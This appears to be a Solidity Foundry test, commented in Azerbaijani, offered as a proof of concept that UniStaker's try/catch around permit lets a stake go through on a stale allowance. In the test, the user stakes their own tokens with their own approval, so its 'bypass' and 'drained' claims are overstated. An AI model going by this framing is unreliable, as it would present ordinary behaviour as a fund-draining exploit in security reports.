// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract UniStakerPermitBypassTest is Test {
    address user = address(0x1337);
    
    MockStakeToken token;
    UniStakerMock staker;

    function setUp() public {
        token = new MockStakeToken();
        staker = new UniStakerMock(address(token));
        token.mint(user, 1000 ether);
    }

    function testUniStakerPermitSwallowingBypass() public {
        vm.startPrank(user);

        // 1. İstifadəçinin əvvəldən qalan köhnə icazəsi (stale allowance) mövcuddur
        uint96 amount = 500 ether;
        token.approve(address(staker), amount);
        
        assertEq(token.allowance(user, address(staker)), amount, "Stale allowance must exist");

        // 2. Yanlış deadline ilə permit çağırırıq (Permit mütləq fail olacaq)
        uint256 invalidDeadline = block.timestamp - 100; 
        uint8 v = 27;
        bytes32 r = bytes32(0);
        bytes32 s = bytes32(0);

        // 3. Try/Catch səhvi udur və tranzaksiya revert olmur! Köhnə allowance ilə steyk baş tutur.
        staker.permitAndStake(amount, address(0x1), address(user), invalidDeadline, v, r, s);

        vm.stopPrank();

        // 4. Sübut: Permit fail olmasına baxmayaraq, istifadəçinin vəsaiti çəkildi
        assertEq(token.balanceOf(user), 500 ether, "Bypassed permit and drained via stale allowance!");
    }
}

contract MockStakeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8, bytes32, bytes32) external {
        require(block.timestamp <= deadline, "Expired");
        allowance[owner][spender] = value;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(allowance[from][msg.sender] >= amt, "Low allowance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        allowance[from][msg.sender] -= amt;
        return true;
    }
}

contract UniStakerMock {
    address public stakeToken;
    constructor(address _token) { stakeToken = _token; }

    function permitAndStake(uint96 _amount, address, address, uint256 _deadline, uint8 _v, bytes32 _r, bytes32 _s) external {
        // UniStaker-dəki try/catch pattern-i:
        try MockStakeToken(stakeToken).permit(msg.sender, address(this), _amount, _deadline, _v, _r, _s) {} 
        catch {}

        // Permit xətası udulur və köhnə allowance ilə davam edir:
        MockStakeToken(stakeToken).transferFrom(msg.sender, address(this), _amount);
    }
}
